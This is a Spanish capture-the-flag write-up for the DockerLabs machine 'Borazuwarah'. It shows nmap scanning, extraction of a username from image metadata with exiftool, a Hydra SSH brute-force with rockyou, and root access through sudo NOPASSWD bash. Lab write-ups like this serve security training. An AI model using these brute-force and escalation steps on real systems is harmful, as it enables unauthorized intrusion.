---
tags:
  - CTF
  - writeup
  - dockerlabs
  - linux
  - privesc
  - ssh
  - esteganografia
dificultad: "⭐ Muy fácil"
sistema: "Debian Linux"
ip: "172.17.0.2"
técnicas:
  - Análisis de metadatos (exiftool)
  - Fuerza bruta SSH
  - Abuso de sudo (NOPASSWD bash)
fecha: 2026-06-12
estado: "✅ Completada"
---

# 🖥️ Máquina: Borazuwarah

## Información general

- **Plataforma:** DockerLabs
- **Dificultad:** Muy fácil
- **SO:** Debian Linux
- **IP objetivo:** `172.17.0.2`
- **Técnicas:** Metadatos de imagen · Fuerza bruta SSH · Escalada con sudo NOPASSWD

---

## 🗺️ Flujo del ataque

```
Ping → Nmap (SSH + HTTP) → curl → imagen.jpeg → exiftool (usuario) → Hydra → SSH → sudo bash → root
```

---

## 1️⃣ Reconocimiento

### Verificación de conectividad

```bash
ping 172.17.0.2
```

```
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.070 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.068 ms
```

**TTL = 64 → Sistema Linux confirmado**

---

### Escaneo de puertos con Nmap

```bash
sudo nmap -p- -sS -sCV --min-rate 5000 -n -Pn -vvv -oN scan 172.17.0.2
```

**Resultado:**

|Puerto|Estado|Servicio|Versión|
|---|---|---|---|
|22/tcp|open|SSH|OpenSSH 9.2p1 Debian|
|80/tcp|open|HTTP|Apache httpd 2.4.59 (Debian)|

---

## 2️⃣ Enumeración web

Revisamos el contenido de la página con curl:

```bash
curl -i http://172.17.0.2
```

```html
<html><body><img src='imagen.jpeg'></body></html>
```

La página únicamente contiene una imagen. La descargamos para inspeccionarla:

```bash
wget http://172.17.0.2/imagen.jpeg
```

---

## 3️⃣ Análisis de metadatos — exiftool

```bash
exiftool imagen.jpeg
```

**Resultado relevante:**

```
Description  : ---------- User: borazuwarah ----------
Title        : ---------- Password:  ----------
```

**Usuario identificado en los metadatos de la imagen:** `borazuwarah`

**Nota:** El campo `Title` indica que la contraseña está vacía en los metadatos. Esto significa que tendremos que obtenerla por fuerza bruta.

---

## 4️⃣ Acceso inicial — Fuerza bruta SSH

Con el usuario extraído de los metadatos lanzamos Hydra:

```bash
hydra -l borazuwarah -P ~/Desktop/Lists/Rockyou/rockyou.txt -v -t 64 ssh://172.17.0.2 -o hydra
```

**Resultado:**

```
[22][ssh] host: 172.17.0.2   login: borazuwarah   password: 123456
```

**Credenciales válidas:** `borazuwarah:123456`

---

### Conexión SSH

```bash
ssh borazuwarah@172.17.0.2
# Password: 123456
```

```
borazuwarah@6e8dc307494a:~$
```

---

## 5️⃣ Escalada de privilegios

### Enumeración de permisos sudo

```bash
sudo -l
```

```
User borazuwarah may run the following commands on 6e8dc307494a:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/bash
```

**Nota:** Hay dos entradas relevantes. La primera `(ALL : ALL) ALL` permite ejecutar cualquier comando como root, pero requiere contraseña. La segunda `NOPASSWD: /bin/bash` permite abrir bash como root **sin contraseña**, que es el vector que usaremos.

### Explotación

```bash
sudo /bin/bash
```

```
root@6e8dc307494a:/home/borazuwarah# id
uid=0(root) gid=0(root) groups=0(root)

root@6e8dc307494a:/home/borazuwarah# whoami
root
```

**Acceso root obtenido.**

---

## ✅ Resumen de credenciales

|Usuario|Contraseña|Método|
|---|---|---|
|borazuwarah|123456|exiftool + Hydra + rockyou|
|root|—|sudo NOPASSWD /bin/bash|

---

## 📚 Referencias

- [ExifTool](https://exiftool.org/)
- [Hydra — THC](https://github.com/vanhauser-thc/thc-hydra)
- [GTFOBins — bash](https://gtfobins.github.io/gtfobins/bash/)
